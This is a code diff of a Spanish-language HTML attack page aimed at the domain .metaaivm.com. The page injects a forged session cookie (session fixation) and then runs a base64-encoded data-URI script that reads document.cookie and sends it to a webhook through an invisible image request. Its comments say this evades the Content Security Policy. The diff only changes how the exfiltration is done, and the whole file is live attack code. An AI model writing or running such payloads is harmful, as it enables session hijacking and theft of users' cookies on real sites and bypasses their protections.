@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prueba Cross-User Real</title>
+    <title>Exfiltración Real</title>
     <style>
         body { font-family: monospace; padding: 20px; background: #1e1e1e; color: #00ff00; }
         h1 { color: #fff; }
-        #console { background: #000; padding: 15px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; border: 1px solid #333; min-height: 200px; }
+        #console { background: #000; padding: 15px; border-radius: 8px; white-space: pre-wrap; border: 1px solid #333; min-height: 200px; }
         .success { color: #00ff00; font-weight: bold; }
         .error { color: #ff0000; }
         .info { color: #ffff00; }
     </style>
 </head>
 <body>
-    <h1>Cross-User Attack (Live)</h1>
-    <div id="console">Iniciando ataque...</div>
+    <h1>Exfiltración Vía Imagen</h1>
+    <div id="console">Iniciando...</div>
 
     <script>
         const consola = document.getElementById('console');
@@ -29,47 +29,52 @@
             consola.scrollTop = consola.scrollHeight;
         }
 
-        log("Iniciando ataque Cross-User...", "info");
+        log("Iniciando inyección...", "info");
 
-        // 1. INYECCIÓN DE COOKIE (Session Fixation)
+        // 1. Inyectamos la cookie
         try {
             document.cookie = "muse_session_hijacked=CUENTA_2_HACKEADA; path=/; domain=.metaaivm.com; secure; SameSite=None";
-            log("✅ Cookie inyectada en .metaaivm.com (Session Fixation).", "success");
+            log("✅ Cookie inyectada: " + document.cookie, "success");
         } catch (e) {
-            log("❌ Error al inyectar cookie: " + e.message, "error");
+            log("❌ Error al inyectar: " + e.message, "error");
         }
 
-        // 2. LECTURA DE COOKIES
-        const victimCookies = document.cookie;
-        log("Cookies actuales en document.cookie: " + (victimCookies || "(vacío)"), "info");
-
-        // 3. EXFILTRACIÓN VÍA DATA URI (Bypass del CSP)
-        log("Preparando exfiltración vía Data URI...", "info");
+        // 2. Exfiltración vía Data URI + Image Tag
+        log("Intentando exfiltrar vía Data URI + <img>...", "info");
         
         try {
+            // El payload crea una imagen invisible y le pone la URL con las cookies
             const exfilPayload = `
                 try {
-                    fetch('${webhookUrl}?cross_user=true', {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: 'Cookies: ' + document.cookie
-                    });
-                } catch(e) {}
+                    // Leemos las cookies
+                    const data = document.cookie;
+                    
+                    // Creamos la imagen invisible
+                    const img = new Image();
+                    img.src = "${webhookUrl}?exfil_img=true&cookies=" + encodeURIComponent(data);
+                    
+                    // La añadimos al DOM para forzar la carga
+                    document.body.appendChild(img);
+                    
+                    console.log("Imagen de exfiltración inyectada.");
+                } catch(e) {
+                    console.error(e);
+                }
             `;
             
+            // Ejecutamos el payload en un Data URI (evade el CSP de scripts)
             const base64Payload = btoa(unescape(encodeURIComponent(exfilPayload)));
-            import("data:text/javascript;base64," + base64Payload)
-                .then(() => log("✅ Exfiltración enviada al webhook.", "success"))
-                .catch((e) => log("❌ Error en exfiltración: " + e.message, "error"));
+            
+            // Creamos un script dinámico con el Data URI
+            const script = document.createElement('script');
+            script.src = "data:text/javascript;base64," + base64Payload;
+            document.body.appendChild(script);
+            
+            log("✅ Script de exfiltración inyectado. Revisa el webhook.", "success");
 
         } catch (e) {
-            log("❌ Error al exfiltrar: " + e.message, "error");
+            log("❌ Error al preparar exfiltración: " + e.message, "error");
         }
-
-        // 4. MOSTRAR ENTORNO
-        log("Entorno: Origen = " + window.location.origin, "info");
-        log("Entorno: Referrer = " + (document.referrer || "(vacío)"), "info");
-        log("Entorno: User-Agent = " + navigator.userAgent, "info");
     </script>
 </body>
 </html>
